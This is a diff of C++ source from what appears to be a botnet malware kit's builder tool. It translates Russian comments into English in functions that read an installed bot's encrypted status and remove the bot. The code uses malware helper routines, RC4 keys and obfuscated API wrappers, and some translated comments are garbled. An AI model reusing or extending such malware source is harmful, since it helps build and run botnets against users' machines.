@@ -25,7 +25,7 @@
 */
 static bool getBotStatus(HWND hwnd, BotStatus::VER1 **bs)
 {
-  //Получаем ключ.
+  //Obtain the key.
   Crypt::RC4KEY key;
   {
     bool ok = false;
@@ -50,7 +50,7 @@ static bool getBotStatus(HWND hwnd, BotStatus::VER1 **bs)
     if(ok == false)return false;
   }
 
-  //ID текущего пользователя.
+  //Current user ID.
   DWORD userId;
   {
     TOKEN_USER *token;
@@ -63,7 +63,7 @@ static bool getBotStatus(HWND hwnd, BotStatus::VER1 **bs)
     else return false;
   }
 
-  //Генерируем имя объекта.
+  //Generate an object name.
   WCHAR installId[40];
   {
     GUID osGuid;
@@ -71,7 +71,7 @@ static bool getBotStatus(HWND hwnd, BotStatus::VER1 **bs)
     MalwareTools::_generateKernelObjectName(&osGuid, 0x84939312/*Core::OBJECT_ID_BOT_STATUS*/, userId, installId, &key, MalwareTools::KON_DEFAULT);
   }
 
-  //Получем статус.
+  //Get status.
   if(CWA(kernel32, GetFileAttributesExW)(installId, (GET_FILEEX_INFO_LEVELS)0x78F16360/*Core::OBJECT_ID_BOT_STATUS_SECRET*/, bs) == TRUE)
   {
     if((*bs)->structSize == sizeof(BotStatus::VER1))
@@ -129,7 +129,7 @@ static DWORD WINAPI removeBot(void *p)
   CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_INFO_BOT_REMOVE), FALSE);
   CWA(user32, SetDlgItemTextW)(hwnd, IDC_INFO_BOT_INFO, Languages::get(Languages::tool_info_bot_removing));
 
-  //Процесс удаления.
+  //Removal process.
   {
     BotStatus::VER1 *bs;
     if(getBotStatus(hwnd, &bs))
@@ -143,19 +143,17 @@ static DWORD WINAPI removeBot(void *p)
   CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_INFO_BOT_REMOVE), TRUE);
   refreshBotStatus(hwnd);
 
-  //Выводим сообщение.
+  //Displaying a message.
   if(ok)CWA(user32, MessageBoxW)(hwnd, Languages::get(Languages::tool_info_bot_removed), NULL, MB_OK | MB_ICONINFORMATION);
   else CWA(user32, MessageBoxW)(hwnd, Languages::get(Languages::tool_info_bot_not_removed), NULL, MB_OK | MB_ICONERROR);
 
   return 0;
 }
 
-/*
-  Обработка вкладки.
-*/
+/*В В Processing tab.*/
 INT_PTR CALLBACK toolInformationProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
-  //Хэндл поток удаления бота.
+  //Handle to remove the stream bot.
   static HANDLE subThread;
 
   switch(msg)
